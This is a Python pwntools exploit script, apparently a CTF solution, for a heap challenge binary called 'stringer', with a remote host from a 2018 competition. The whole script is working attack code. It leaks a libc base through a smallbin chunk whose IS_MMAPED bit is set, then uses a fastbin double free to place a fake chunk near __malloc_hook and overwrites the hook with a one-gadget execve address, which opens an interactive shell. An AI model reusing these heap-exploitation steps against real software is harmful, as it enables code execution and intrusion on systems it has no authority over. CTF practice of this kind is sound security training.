from pwn import *

DEBUG = 1

def add_string(size, content, is_attack=False):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('please input string length: ')
    p.sendline(str(size))

    if not is_attack:
        p.recvuntil('please input the string content: ')
        p.send(content)
        p.recvuntil('your string: ')

def view_string(title):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil("don't even think about it")

def edit_string(index, offset):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('please input the index: ')
    p.sendline(str(index))
    p.recvuntil('input the byte index: ')
    p.sendline(str(offset))

def delete_string(index):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('please input the index: ')
    p.sendline(str(index))

def leak():

    add_string(24, 'a' * 24)        # 0 (32) fastbin_1
    add_string(128, 'b' * 128)      # 1 (144) smallbin_1
    add_string(24,  'c' * 24)       # 2 (32) fastbin_2

    delete_string(1)

    # its size changes from 0x91 to 0x93 (PREV_INUSE && IS_MMAPED)
    edit_string(0, 24)
    edit_string(0, 24)

    # smallbin_2 will be placed in smallbin_1's chunk
    add_string(128, 'd' * 7 + '\n') # 3 (144) smallbin_2

    # leak bk pointer of smallbin_1
    p.recvuntil('d' * 7 + '\n')
    return u64(p.recv(6) + '\x00\x00') - 0x3c4b78

def exploit(libc_base):

    # allocate two fastbins to launch the fastbin attack using double free
    add_string(96, 'e' * 96)        # 4 (112) fastbin_3
    add_string(96, 'f' * 96)        # 5 (112) fastbin_4

    delete_string(4)
    delete_string(5)
    delete_string(4)

    fake_chunk = libc_base + 0x3c4aed			# before __malloc_hook
    print 'Fake Chunk: {}'.format(hex(fake_chunk))
    add_string(96, p64(fake_chunk) + 'g' * 88)          # 6 (112) fastbin_5

    add_string(96, 'h' * 96)                            # 7 (112) fastbin_6

    add_string(96, 'i' * 96)                            # 8 (112) fastbin_7

    execve_addr = libc_base + 0xf02a4 			# oneshot address
    add_string(96, 'i' * 19 + p64(execve_addr) + '\n')  # 9 (112) fastbin_8

    add_string(1, '\n', True)

if __name__ == '__main__':
    if DEBUG == 1:
      p = process('./stringer')
    else:
      p = remote('stringer.2018.teamrois.cn',7272)

    libc_base = leak()
    print 'libc base: {}'.format(hex(libc_base))

    exploit(libc_base)

    p.interactive()

